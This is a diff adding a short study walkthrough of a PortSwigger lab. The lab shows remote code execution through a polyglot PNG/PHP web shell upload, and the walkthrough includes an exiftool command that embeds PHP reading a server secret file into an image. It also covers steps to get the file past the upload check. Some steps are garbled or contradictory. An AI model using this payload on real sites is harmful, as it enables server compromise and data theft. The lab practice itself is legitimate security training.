@@ -1,0 +1,19 @@
+lab6: Remote code execution via polyglot web shell upload
+lab link: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
+
+thsi lab practice on polyglot file, so try upload polyglot file that execute php code that get the secret. 
+
+1. test, application check the content of the file or no .
+	1.1. create arbitrary png file(myImg.png), upload it (upload any png file).
+	1.2. go to proxy>http history > find Post /my-account/avatar request, then send it to repeater.
+	1.3. in repeater, in the img part, change content-type from image/png to application/x-php.  send the request
+	1.4. the file uploaded successfully, this means that the app. check the content of the file.   
+	
+2. now, the goal is uploading the polyglot file(png and php) that run as php to get the secret and contain the contents of the png file and the php file. 
+3. prepare exiftool to create the polyglot file. // install it 
+4. run this payload in your terminal:  exiftool -Comment="<?php echo 'STARTPhpRes ' . file_get_contents('/home/carlos/secret') . ' ENDPhpRes'; ?>" myImg.png -o webShell.php   , this put the res of php code inside the content of the png file (res between STARTPhpRes and ENDPhpRes), then the webShell.png file is created.
+5. upload webShell.php file
+6. in my account page, right click on the avatar img. the content of the file shows.
+7. search for STARTPhpRes, the secret followed it.
+8. submit the secret in the lab banner 
+
